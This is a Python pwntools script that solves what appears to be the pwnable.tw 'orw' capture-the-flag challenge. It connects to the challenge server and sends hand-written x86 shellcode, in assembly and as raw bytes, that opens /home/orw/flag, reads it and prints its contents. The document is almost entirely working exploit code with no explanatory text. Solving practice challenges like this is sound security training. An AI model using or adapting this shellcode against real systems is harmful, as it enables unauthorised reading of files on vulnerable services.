#!/usr/bin/env python

from pwn import *
r = remote('chall.pwnable.tw', 10001)

flag1 = b'/hom' 
# Output from flag1.hex()
# 0x2f,0x68,0x6f,0x6d
flag2 = b'e/or'
# 0x65,0x2f,0x6f,0x72
flag3 = b'w/fl' 
# 0x77,0x2f,0x66,0x6c
flag4 = b'ag\x00'
# 0x61,0x67,0x00

shellcode = '''
mov eax, 0x00006761
push eax
mov eax, 0x6c662f77
push eax
mov eax, 0x726f2f65
push eax
mov eax, 0x6d6f682f
push eax
push esp
pop ebx
xor ecx, ecx
xor eax, eax
add eax, 5
int 0x80
sub esp, 0x30
lea ecx, [esp]
mov ebx, eax
xor edx, edx
add edx, 0x30
xor eax, eax
add eax, 3
int 0x80
xor ebx, ebx
add ebx, 1
xor eax, eax
add eax, 4
int 0x80
'''

shellcode = "\xB8\x61\x67\x00\x00\x50\xB8\x77\x2F\x66\x6C\x50\xB8\x65\x2F\x6F\x72\x50\xB8\x2F\x68\x6F\x6D\x50\x54\x5B\x31\xC9\x31\xC0\x83\xC0\x05\xCD\x80\x83\xEC\x30\x8D\x0C\x24\x89\xC3\x31\xD2\x83\xC2\x30\x31\xC0\x83\xC0\x03\xCD\x80\x31\xDB\x83\xC3\x01\x31\xC0\x83\xC0\x04\xCD\x80"
r.recvuntil(':')
r.sendline(shellcode)
print r.recv()
r.interactive()
